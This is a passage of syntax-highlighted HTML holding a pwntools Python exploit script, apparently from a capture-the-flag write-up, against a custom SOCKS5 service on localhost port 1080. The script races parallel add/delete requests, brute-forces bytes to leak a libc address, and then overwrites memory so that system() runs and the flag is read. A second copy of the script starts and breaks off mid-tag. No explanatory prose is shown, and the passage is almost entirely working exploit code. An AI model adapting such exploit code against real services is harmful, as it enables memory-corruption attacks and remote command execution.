style="color:#a65e2b">(</span><span style="color:#393A34">j</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                    byte_found_event</span><span style="color:#999999">.</span><span style="color:#393A34">set</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            return</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> brute</span><span style="color:#2993a3">(</span><span style="color:#393A34">num_threads</span><span style="color:#AB5959">=</span><span style="color:#2F798A">32</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#AB5959">    global</span><span style="color:#393A34"> sol</span><br><span style="color:#393A34">    sol </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">""</span><br><br><span style="color:#393A34">    info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Bruting first byte...</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> j </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">256</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> j </span><span style="color:#AB5959">%</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 9</span><span style="color:#999999">:</span><br><span style="color:#393A34">            m </span><span style="color:#999999">=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">j</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> sock</span><span style="color:#2993a3">(</span><span style="color:#393A34">m</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">                sol </span><span style="color:#999999">=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">j</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Found first byte => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">j</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">                break</span><br><br><span style="color:#1E754F">    if</span><span style="color:#AB5959"> not</span><span style="color:#393A34"> sol</span><span style="color:#999999">:</span><br><span style="color:#393A34">        error</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Failed to brute the first byte.</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#2F798A"> 0</span><br><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Bruting byte position </span><span style="color:#1e754f">{</span><span style="color:#393A34">i</span><span style="color:#AB5959">+</span><span style="color:#2F798A">2</span><span style="color:#1e754f">}</span><span style="color:#B56959">..."</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        byte_found_event</span><span style="color:#999999">.</span><span style="color:#393A34">clear</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        threads </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">        chunk_size </span><span style="color:#999999">=</span><span style="color:#2F798A"> 256</span><span style="color:#AB5959"> //</span><span style="color:#393A34"> num_threads</span><br><br><span style="color:#1E754F">        for</span><span style="color:#393A34"> t_id </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#393A34">num_threads</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">            start_byte </span><span style="color:#999999">=</span><span style="color:#393A34"> t_id </span><span style="color:#AB5959">*</span><span style="color:#393A34"> chunk_size</span><br><span style="color:#393A34">            start_byte </span><span style="color:#999999">=</span><span style="color:#2F798A"> 1</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> t_id </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 0</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> start_byte</span><br><span style="color:#393A34">            end_byte </span><span style="color:#999999">=</span><span style="color:#2F798A"> 256</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> t_id </span><span style="color:#AB5959">==</span><span style="color:#393A34"> num_threads </span><span style="color:#AB5959">-</span><span style="color:#2F798A"> 1</span><span style="color:#1E754F"> else</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">t_id </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> *</span><span style="color:#393A34"> chunk_size</span><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> start_byte </span><span style="color:#AB5959">></span><span style="color:#AB5959">=</span><span style="color:#393A34"> end_byte</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                continue</span><br><span style="color:#393A34">            thread </span><span style="color:#999999">=</span><span style="color:#393A34"> threading</span><span style="color:#999999">.</span><span style="color:#393A34">Thread</span><span style="color:#2993a3">(</span><span style="color:#B07D48">target</span><span style="color:#999999">=</span><span style="color:#393A34">brute_worker</span><span style="color:#999999">,</span><span style="color:#B07D48"> args</span><span style="color:#999999">=</span><span style="color:#1e754f">(</span><span style="color:#998418">range</span><span style="color:#a65e2b">(</span><span style="color:#393A34">start_byte</span><span style="color:#999999">,</span><span style="color:#393A34"> end_byte</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            threads</span><span style="color:#999999">.</span><span style="color:#393A34">append</span><span style="color:#2993a3">(</span><span style="color:#393A34">thread</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            thread</span><span style="color:#999999">.</span><span style="color:#393A34">start</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">        for</span><span style="color:#393A34"> thread </span><span style="color:#1E754F">in</span><span style="color:#393A34"> threads</span><span style="color:#999999">:</span><br><span style="color:#393A34">            thread</span><span style="color:#999999">.</span><span style="color:#393A34">join</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    final_sol </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> sol</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">final_sol</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> res</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> run_tasks_in_batches</span><span style="color:#2993a3">(</span><span style="color:#393A34">tasks</span><span style="color:#999999">,</span><span style="color:#393A34"> max_threads</span><span style="color:#AB5959">=</span><span style="color:#2F798A">16</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#998418"> len</span><span style="color:#1e754f">(</span><span style="color:#393A34">tasks</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#393A34"> max_threads</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        batch </span><span style="color:#999999">=</span><span style="color:#393A34"> tasks</span><span style="color:#2993a3">[</span><span style="color:#393A34">i</span><span style="color:#999999">:</span><span style="color:#393A34">i</span><span style="color:#AB5959">+</span><span style="color:#393A34">max_threads</span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">        for</span><span style="color:#393A34"> t </span><span style="color:#1E754F">in</span><span style="color:#393A34"> batch</span><span style="color:#999999">:</span><br><span style="color:#393A34">            t</span><span style="color:#999999">.</span><span style="color:#393A34">start</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        for</span><span style="color:#393A34"> t </span><span style="color:#1E754F">in</span><span style="color:#393A34"> batch</span><span style="color:#999999">:</span><br><span style="color:#393A34">            t</span><span style="color:#999999">.</span><span style="color:#393A34">join</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> parallel_add</span><span style="color:#2993a3">(</span><span style="color:#393A34">count</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#999999">,</span><span style="color:#393A34"> max_threads</span><span style="color:#AB5959">=</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Starting </span><span style="color:#1e754f">{</span><span style="color:#393A34">count</span><span style="color:#1e754f">}</span><span style="color:#B56959"> parallel add requests (max </span><span style="color:#1e754f">{</span><span style="color:#393A34">max_threads</span><span style="color:#1e754f">}</span><span style="color:#B56959"> threads at a time)..."</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    tasks </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#393A34">threading</span><span style="color:#999999">.</span><span style="color:#393A34">Thread</span><span style="color:#1e754f">(</span><span style="color:#B07D48">target</span><span style="color:#999999">=</span><span style="color:#393A34">add</span><span style="color:#999999">,</span><span style="color:#B07D48"> args</span><span style="color:#999999">=</span><span style="color:#a65e2b">(</span><span style="color:#393A34">content</span><span style="color:#999999">,</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#1E754F"> for</span><span style="color:#393A34"> _ </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#1e754f">(</span><span style="color:#393A34">count</span><span style="color:#1e754f">)</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    run_tasks_in_batches</span><span style="color:#2993a3">(</span><span style="color:#393A34">tasks</span><span style="color:#999999">,</span><span style="color:#393A34"> max_threads</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Parallel add requests finished.</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> parallel_add_delete</span><span style="color:#2993a3">(</span><span style="color:#393A34">count</span><span style="color:#999999">,</span><span style="color:#393A34"> add_content</span><span style="color:#999999">,</span><span style="color:#393A34"> delete_content</span><span style="color:#999999">,</span><span style="color:#393A34"> max_threads</span><span style="color:#AB5959">=</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Starting </span><span style="color:#1e754f">{</span><span style="color:#393A34">count</span><span style="color:#1e754f">}</span><span style="color:#B56959"> parallel add/delete requests (max </span><span style="color:#1e754f">{</span><span style="color:#393A34">max_threads</span><span style="color:#1e754f">}</span><span style="color:#B56959"> threads at a time)..."</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> worker</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        add</span><span style="color:#2993a3">(</span><span style="color:#393A34">add_content</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        delete</span><span style="color:#2993a3">(</span><span style="color:#393A34">delete_content</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    tasks </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#393A34">threading</span><span style="color:#999999">.</span><span style="color:#393A34">Thread</span><span style="color:#1e754f">(</span><span style="color:#B07D48">target</span><span style="color:#999999">=</span><span style="color:#393A34">worker</span><span style="color:#1e754f">)</span><span style="color:#1E754F"> for</span><span style="color:#393A34"> _ </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#1e754f">(</span><span style="color:#393A34">count</span><span style="color:#1e754f">)</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    run_tasks_in_batches</span><span style="color:#2993a3">(</span><span style="color:#393A34">tasks</span><span style="color:#999999">,</span><span style="color:#393A34"> max_threads</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Parallel add/delete requests finished.</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#1E754F">if</span><span style="color:#998418"> __name__</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">__main__</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">    addr </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000405050</span><br><br><span style="color:#393A34">    parallel_add</span><span style="color:#2993a3">(</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    add</span><span style="color:#2993a3">(</span><span style="color:#393A34">flat</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 103</span><span style="color:#999999">,</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#393A34"> addr </span><span style="color:#AB5959">-</span><span style="color:#2F798A"> 1</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    add</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    reset</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    parallel_add_delete</span><span style="color:#2993a3">(</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">c</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">b</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    add</span><span style="color:#2993a3">(</span><span style="color:#393A34">flat</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 102</span><span style="color:#999999">,</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Leaking libc address...</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    leaked_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> brute</span><span style="color:#2993a3">(</span><span style="color:#B07D48">num_threads</span><span style="color:#999999">=</span><span style="color:#2F798A">16</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> leaked_addr </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#393A34">        error</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Failed to leak address.</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#998418">        exit</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    libc</span><span style="color:#999999">.</span><span style="color:#393A34">address </span><span style="color:#999999">=</span><span style="color:#393A34"> leaked_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">127900</span><br><span style="color:#393A34">    info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc base => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"system addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#a13865">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#a13865">]</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    reset</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    parallel_add</span><span style="color:#2993a3">(</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    add</span><span style="color:#2993a3">(</span><span style="color:#393A34">flat</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 102</span><span style="color:#999999">,</span><span style="color:#AB5959"> -0x</span><span style="color:#2F798A">104</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#a13865">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#a13865">]</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 1</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    add</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">x</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Triggering system()...</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pwn </span><span style="color:#999999">=</span><span style="color:#393A34"> SOCK5Pwn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> pwn</span><span style="color:#999999">.</span><span style="color:#393A34">system</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        success</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Command executed! Check for the flag.</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    pwn</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pwn </span><span style="color:#999999">=</span><span style="color:#393A34"> SOCK5Pwn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pwn</span><span style="color:#999999">.</span><span style="color:#393A34">read_flag</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pwn</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> time</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> threading</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> socket</span><br><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">info</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">arch </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">amd64</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">os </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">linux</span><span style="color:#C98A7D77">'</span><br><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">class</span><span style="color:#5DA994"> SOCK5Pwn</span><span style="color:#666666">:</span><br><span style="color:#CB7676">    def</span><span style="color:#B8A965"> __init__</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> host</span><span style="color:#CB7676">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">127.0.0.1</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">1080</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">host </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> host</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">port </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> port</span><br><span style="color:#4D9375">        try</span><span style="color:#666666">:</span><br><span style="color:#C99076">            self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">host</span><span style="color:#666666">,</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">port</span><span style="color:#666666">,</span><span style="color:#BD976A"> timeout</span><span style="color:#666666">=</span><span style="color:#4C9A91">10</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        except</span><span style="color:#B8A965"> Exception</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> e</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            while</span><span style="color:#4D9375"> True</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Reconnecting due to error: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">e</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#C99076">                self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">host</span><span style="color:#666666">,</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">port</span><span style="color:#666666">,</span><span style="color:#BD976A"> timeout</span><span style="color:#666666">=</span><span style="color:#4C9A91">10</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">                if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">:</span><br><span style="color:#4D9375">                    break</span><br><span style="color:#4D9375">            pass</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> method</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        request </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">method</span><span style="color:#5eaab5">)</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">request</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        response </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">response</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><br><span style="color:#DBD7CAEE">        ver</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> selected </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> response</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> response</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> ver </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 5</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> selected</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> _add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> msg</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        res </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> res </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> None</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">msg</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        result </span><span 